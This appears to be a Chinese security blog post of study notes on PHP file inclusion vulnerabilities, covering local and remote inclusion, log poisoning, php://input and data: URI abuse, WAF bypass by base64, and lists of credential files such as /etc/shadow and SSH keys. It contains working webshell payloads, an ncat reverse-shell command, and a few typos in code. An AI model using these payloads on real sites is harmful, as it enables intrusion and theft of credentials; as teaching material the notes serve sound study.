---
layout:     post
title:      Web笔记（十）文件包含漏洞
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是学习文件包含漏洞，记录的一些笔记。
date:       2020-12-02
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - 文件包含
---



## 0x00  文件包含漏洞简介

程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。

程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。

几乎所有脚本语言都会提供文件包含功能，但文件包含漏洞在PHP Web Application中居多，而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。

在PHP中经常出现包含漏洞，但这并不意味着其他语言不存在。



## 0x01 常见文件包含函数

- include()    执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行。

- require()    只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本。

- include_once()和require_once()    若文件中代码已被包含则不会再次包含。



## 0x02 利用条件

- 程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件

- 用户能够控制该动态变量



## 0x03 漏洞危害

- 执行任意代码

- 包含恶意文件控制网站
- 甚至控制服务器



## 0x04 漏洞分类

#### 1. 本地文件包含

可以包含本地文件，在条件允许时甚至能执行代码。

- 上传图片马，然后包含
- 读敏感文件，读PHP文件
- 包含日志文件getshell
- 包含/proc/self/envion文件getshell
- 包含data:或php://input等伪协议
- 若有phpinfo则可以包含临时文件

#### 2. 远程文件包含

可以直接执行任意代码。
```
http://xxx.com/xxx.php?file=http://xxx.com/x.php
```

**远程文件包含要保证php.ini中allow_url_fopen和allow_url_include要为On**



## 0x05 漏洞挖掘

通过白盒代码审计
* 
黑盒工具挖掘
* 
  AWVS、Appscan、Burpsuite
* 
  w3af



## 0x06 本地包含漏洞

#### 1. 文件包含漏洞利用的条件

- inlcude()等函数通过动态变量的方式引入需要包含的文件
- 用户能控制该动态变量
```php
<?php
$test=$_GET['c'];
include($test);
?>
```

保存为include.php，在同一个目录下创建test.txt内容为`<?php phpinfo()?>`

然后访问测试：http://127.0.0.1/test/include.php?c=test.txt

#### 2. 本地包含漏洞注意事项

- 相对路径：../../../../etc/password

* 
%00截断包含（PHP<5.3.4）（magic_quotes_gpc=off才可以，否则%00会被转义）
```php
<?php
include $_GET['x'].".php";
echo $_GGET['x'].".php";
?>
```



## 0x07 利用技巧

首先上传图片马，马包含以下代码：
```php
<?fputs(fopen("shell.php"),"w"),"<?php eval($_POST[x]);?>"?>
```

上传后图片路径为假设为/uploadfile/x.jpg，当访问http://127.0.0.1/xx.php?page=uploadfile/x.jpg 时，将会在文件夹下生成shell.php，内容为
```php
<?php eval($_POST[x]);?>
```



## 0x08 读敏感文件

#### 1. Windows

- C:\boot.ini        //查看系统版本
- C:\Windows\System32\inetsrv\MetaBase.xml        //IIS配置文件
- C:\Windows\repair\sam        //存储系统初次安装的密码
- C:\Program Files\mysql\my.ini        //Mysql配置
- C:\Program Files\mysql\data\mysql\user.MYD        //Mysql root
- C:\Windows\php.ini        //php配置信息
- C:\Windows\my.ini        //Mysql配置信息

#### 2. Linux

- /root/.ssh/authorized_keys
- /root/.ssh/id_rsa
- /root/.ssh/id_rsa.keystore
- /root/.ssh/known_hosts
- /etc/passwd
- /etc/shadow
- /etc/my.cnf
- /etc/httpd/conf/httpd.conf
- /root/.bash_history
- /root/.mysql_history
- /proc/self/fd/fd[0-9]*   （文件标识符）
- /proc/mounts
- /proc/config.gz



## 0x09 包含日志

把日志文件包含进来，主要是想找到日志的路径。

- 文件包含漏洞读取apache配置文件
  - index.php?page=/etc/init.d/httpd
  - index.php?page=/etc/httpd/conf/httpd.conf
- 默认位置：/var/log/httpd/access_log

找到日志路径之后，可以利用其记录访问链接信息，我们构造一个访问请求就会被记录下来，那就可以构造一个带有webshell的链接，然后文件包含日志来getshell。

日志会记录客户端请求及服务器响应的信息，访问http://www.com/\<?php phpinfo(); ?\>时，\<?php phpinfo();?\>也会被记录在日志里，也可以插入到User-Agent中。注意可以用Burpsuite发送来绕过URL编码。

示例：制作错误，写入一句话
```
http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}
```

菜刀连接即可。



## 0x0a 读PHP文件

直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：
```
?page=php://filter/read=convert.base64-encode/resource=config.php
```

访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码。



## 0x0b PHP封装协议

当allow_url_include=On时，若执行http://www.com/index.php?page=php://input ，并且提交数据
```
<?php fputs(fopen("shell.php","w"),"<?php eval($_POST[x])?>")?>
```

结果将在index.php所在路径下生成一句话文件shell.php



## 0x0c 远程包含

远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的。

若在a.txt写入
```
<?php fputs(fopen("shell.php","w"),"<?php @eval($_POST[x]);?>")?>
```



## 0x0d php输入输出流

PHP提供了一些杂项输入/输出（IO）流，允许访问PHP的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。

#### 1. php://input简介

php://input是个可以访问请求的原始数据的只读流。POST请求的情况下，最好使用php://input来代替$HTTP_RAW_POST_DATA，因为它不依赖与特定的php.ini指令。

而且这样的情况下$HTTP_RAW_POST_DATA默认没有填充，比激活always_populate_raw_post_data潜在需要更少的内存。

enctype="multipart/form-data"的时候php://input是无效的。

#### 2. 利用php://input 插入一句话木马
```php
<?php
@eval(file_get_contents('php://input'));    
?>
```

php://input是用来接收post数据，在post中插入数据：
```
system('ncat -e /bin/bash localhost 1234');
```

测试了一下nc反弹shell的利用。

#### 3. php://input将文件包含漏洞变成代码执行漏洞

文件中存在包含漏洞的代码：
```php
<?php @include($_GET['file'])?>
```

使用php://input，将执行代码通过hackbar在POST data中提交，即构造请求，请求链接如下：
```
http://127.0.0.1/index.php?file=php://input
```

然后用hackbar或其他工具在POST data处写入：
```
<?php system('ifconfig');?>
```

#### 4. data URI schema

将文件包含漏洞变成代码执行漏洞并绕过360网站卫士的WAF。

很多时候我们是急需读取PHP格式的配置文件，例如：

- dedecms数据库配置文件data/common.inc.php
- discuz全局配置文件config/config_global.php
- phpcms配置文件caches/configs/database.php
- phpwind配置文件conf/database.php
- phpwind配置文件conf/database.php
- wordpress配置文件wp-config.php

举个例子，读取指定文件FileInclude.php的代码：
```
http://127.0.0.1/index.php?file=data:text/plain,<?php system('cat /var/www/FileInclude.php')?>
```

注意，我们看到转化后的GET请求的参数中包含\<?的标记，在遇到有些WAF，包括云WAF（例如360网站卫士），就会被视为攻击代码而拦截下来，所以一般会加base64编码。
```
# base64编码后传输
data:text/plain;base64,[攻击代码的base64编码]

# 直接传输
data:text/plain,[攻击代码]
```

#### 5. php://filter

php://filter可以读取php文件的源码内容。

用法：
```
php://filter/read=convert.base64-encode/resource=[文件路径]
```

将得到的base64的数据解码得到php文件内容。